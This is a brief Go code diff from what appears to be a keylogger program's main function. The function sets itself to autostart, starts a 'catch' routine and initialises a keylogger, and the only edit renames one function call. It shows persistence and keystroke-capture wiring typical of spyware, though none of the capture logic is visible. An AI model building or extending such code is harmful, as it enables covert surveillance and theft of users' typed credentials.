@@ -11,6 +11,6 @@ func main() {
 	if !autostart.Check(app) {
 		autostart.Set(app)
 	}
-	go catch.InitCatcher()
+	go catch.Init()
 	keylogger.Init()
 }
